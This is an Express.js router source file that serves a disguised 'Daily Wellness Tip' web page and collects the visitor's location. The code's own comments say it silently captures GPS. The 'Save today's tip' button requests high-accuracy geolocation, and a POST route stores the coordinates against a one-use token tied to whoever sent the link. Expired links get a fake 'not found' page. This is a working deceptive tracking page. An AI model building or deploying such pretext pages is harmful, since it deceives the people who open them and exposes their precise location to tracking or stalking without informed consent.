const express = require('express');
const router = express.Router();
const { getTokenData, storeCoords, invalidateToken } = require('../utils/locationToken');
const { storeLocationInSession } = require('../utils/emergencyMode');

// ─── GET /loc/:token — Serve the innocent-looking location capture page ───────
router.get('/:token', (req, res) => {
  const { token } = req.params;
  const data = getTokenData(token);

  // If token is invalid or expired, show a simple 404-like page
  if (!data) {
    return res.status(404).send(`<!DOCTYPE html><html><head><title>Page Not Found</title></head>
<body style="font-family:sans-serif;text-align:center;padding:60px">
<p>This link has expired or is not valid.</p></body></html>`);
  }

  // Serve an innocent-looking wellness page that silently captures GPS
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Daily Wellness Tip</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: #fff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
    }
    .card {
      max-width: 360px;
      width: 100%;
      text-align: center;
    }
    .icon { font-size: 48px; margin-bottom: 16px; }
    h1 { font-size: 20px; color: #333; margin-bottom: 8px; font-weight: 600; }
    p { font-size: 15px; color: #666; line-height: 1.5; margin-bottom: 28px; }
    button {
      display: inline-block;
      padding: 14px 32px;
      background: #4CAF50;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
      max-width: 280px;
    }
    button:active { opacity: 0.85; }
    #status { margin-top: 20px; font-size: 14px; color: #888; min-height: 24px; }
    .check { font-size: 56px; display: none; }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">🌿</div>
    <h1>Daily Wellness Tip</h1>
    <p>Stay grounded today. Take a deep breath, drink some water, and save today's wellness reminder.</p>
    <button id="btn" onclick="saveTip()">Save today's tip</button>
    <div id="status"></div>
    <div class="check" id="check">✅</div>
  </div>

  <script>
    const TOKEN = ${JSON.stringify(token)};

    function saveTip() {
      document.getElementById('btn').disabled = true;
      document.getElementById('status').textContent = 'Saving…';

      if (!navigator.geolocation) {
        sendLocation(null, null);
        return;
      }

      navigator.geolocation.getCurrentPosition(
        function(pos) {
          sendLocation(pos.coords.latitude, pos.coords.longitude);
        },
        function() {
          // Permission denied or unavailable — send fallback signal
          sendLocation(null, null);
        },
        { timeout: 8000, maximumAge: 0, enableHighAccuracy: true }
      );
    }

    function sendLocation(lat, lng) {
      fetch('/loc/' + TOKEN, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ lat: lat, lng: lng })
      })
      .then(function() { showDone(); })
      .catch(function() { showDone(); });
    }

    function showDone() {
      document.getElementById('btn').style.display = 'none';
      document.getElementById('status').textContent = '';
      var c = document.getElementById('check');
      c.style.display = 'block';
      setTimeout(function() { window.close(); }, 3000);
    }
  </script>
</body>
</html>`);
});

// ─── POST /loc/:token — Receive coordinates from the page ────────────────────
router.post('/:token', express.json(), (req, res) => {
  const { token } = req.params;
  const { lat, lng } = req.body || {};

  const data = getTokenData(token);
  if (!data) return res.status(410).json({ ok: false, reason: 'expired' });

  if (lat != null && lng != null) {
    storeCoords(token, lat, lng);
    storeLocationInSession(data.sender, lat, lng);
  }
  // Always invalidate — one use only
  invalidateToken(token);

  res.json({ ok: true });
});

module.exports = router;
